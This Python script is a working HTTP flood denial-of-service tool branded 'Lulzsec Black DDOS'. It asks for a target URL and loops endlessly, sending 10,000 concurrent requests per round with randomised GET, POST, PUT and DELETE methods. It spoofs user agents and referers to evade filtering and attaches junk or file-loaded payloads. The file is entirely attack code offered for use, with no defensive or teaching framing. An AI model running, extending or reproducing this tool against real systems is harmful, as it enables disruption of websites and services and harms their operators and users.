import aiohttp
import asyncio
import random
import string
import pyfiglet
from colorama import Fore, init
init(autoreset=True)
ascii_banner = pyfiglet.figlet_format("Lulzsec Black DDOS")
print(Fore.RED + ascii_banner)
async def send_request(url, session):
    try:
        data = generate_random_data()
        headers = generate_headers()
        request_type = random.choice(['GET', 'POST', 'PUT', 'DELETE'])
        
        print(Fore.YELLOW + f"Sending {request_type} request to {url}")
        
        if request_type == 'GET':
            async with session.get(url, headers=headers) as response:
                print(Fore.GREEN + f"GET request sent: {response.status}")
        elif request_type == 'POST':
            async with session.post(url, data=data, headers=headers) as response:
                print(Fore.GREEN + f"POST request sent: {response.status}")
        elif request_type == 'PUT':
            async with session.put(url, data=data, headers=headers) as response:
                print(Fore.GREEN + f"PUT request sent: {response.status}")
        elif request_type == 'DELETE':
            async with session.delete(url, headers=headers) as response:
                print(Fore.GREEN + f"DELETE request sent: {response.status}")
        await asyncio.sleep(0.001)  
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
def generate_user_agent():
    user_agents = load_file('user_agents.txt')
    if user_agents:
        return random.choice(user_agents)
    else:
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.64",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QD1A.200205.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
        ]
def generate_headers():
    headers = {
        'User-Agent': generate_user_agent(),
        'Referer': random.choice(load_file('headers.txt')) if load_file('headers.txt') else 'https://www.example.com',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive'
    }
    return headers
def generate_random_data():
    payloads = load_file('payloads.txt')
    if payloads:
        return random.choice(payloads).encode()
    else:
        length = 2000  
        letters = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(letters) for _ in range(length)).encode()
def load_file(file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.read().splitlines()
        return lines
    except FileNotFoundError:
        print(Fore.YELLOW + f"No file found at {file_path}")
        return []
async def main():
    target_url = input("Enter the target URL: ")
    while True:
        try:
            connector = aiohttp.TCPConnector(limit_per_host=5000, limit=50000)  
            async with aiohttp.ClientSession(connector=connector) as session:
                tasks = []
                for _ in range(10000):  
                    task = asyncio.create_task(send_request(target_url, session))
                    tasks.append(task)
                await asyncio.gather(*tasks)
        except Exception as e:
            print(Fore.RED + f"Main loop error: {e}")
asyncio.run(main())
